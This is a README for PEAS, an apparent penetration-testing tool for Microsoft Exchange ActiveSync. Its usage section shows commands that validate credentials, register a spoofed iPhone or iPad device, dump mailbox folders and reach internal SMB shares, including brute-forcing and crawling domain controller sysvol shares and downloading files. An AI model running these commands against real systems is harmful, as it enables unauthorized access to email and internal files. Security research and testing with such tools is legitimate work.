# PEAS

PEAS is a command line tool to access Microsoft Exchange over ActiveSync.
It is based on [research](https://labs.mwrinfosecurity.com/blog/accessing-internal-fileshares-through-exchange-activesync) by Adam Rutherford and David Chismon of MWR.
The original project targeted Python 2; this fork is fully ported to Python 3.

## Setup

Install with [uv](https://github.com/astral-sh/uv).

~~~ bash
uv tool install git+https://github.com/glynx/peas@master
~~~

## Usage

Check credentials.

~~~ bash
peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --check
~~~

Register a device and note the device id show in the output.

~~~ bash
peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --provision-device --user-agent Apple-iPhone15C4/2301.355 --device-type iPhone --device-name 'iPhone 15' --device-os 'iOS 26.0.1 23A355' --device-model iPhone15C4
~~~

> [!note]
> All device options should be repeated for each following command.
>
> ~~~ bash
> peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --provision-device --user-agent Apple-iPad15C3/2207.100 --device-type iPad --device-name 'iPad Air 11-inch (M3)' --device-os 'iOS 18.6.2 22G100' --device-model iPad15C3
> peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --list-unc '\\localhost' --device-id $id --user-agent Apple-iPad15C3/2207.100 --device-type iPad --device-name 'iPad Air 11-inch (M3)' --device-os 'iOS 18.6.2 22G100' --device-model iPad15C3
> ~~~

Dump emails.

~~~ bash
peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --list-folders
peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --emails --folder Posteingang
peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --emails --folder Posteingang -O ./emails
~~~

Access SMB shares.

~~~ bash
peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --list-unc '\\localhost'
peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --list-unc '\\dc01\sysvol\megacorp.local'
peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --brute-unc --prefix mega
peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --dl-unc '\\dc02\guestshare\file.txt'
peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --dl-unc '\\dc02\guestshare\file.txt' -o ./file.txt
peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --crawl-unc '\\dc02\sysvol\megacorp.local'
peas -u 'megacorp\snovvcrash' -p 'Passw0rd1!' mx.megacorp.com --crawl-unc '\\dc02\sysvol\megacorp.local' --download
~~~

> [!note]
> Using an IP address or FQDN instead of a hostname in the UNC path may fail.

## ActiveSync Cache

When PEAS connects to Exchange, it caches FolderSync results, SyncKeys and policy data in `./pyas_cache/<server>/<user>.asdb`.
The chosen cache file is printed whenever `--emails` or `--list-folders` is executed.
Delete the subdirectory to reset the cache for a specific account.

## Development

Don't look at the source code.
